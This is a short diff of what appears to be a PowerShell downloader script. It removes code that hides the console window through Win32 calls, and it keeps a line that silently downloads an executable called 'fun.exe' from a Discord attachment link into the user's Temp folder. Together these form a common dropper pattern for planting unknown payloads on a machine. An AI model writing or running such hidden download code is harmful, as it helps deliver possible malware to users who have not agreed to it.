@@ -1,11 +1,4 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)     
+
 
 Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/1436095963843526788/fun.exe?ex=690f04d7&is=690db357&hm=4f3457773c08f5f8ca5d69cbb0505ef3c33fb8fdc726daae396c36dce04e4bef&' -OutFile "$env:LOCALAPPDATA\Temp\fun.exe" ;
 
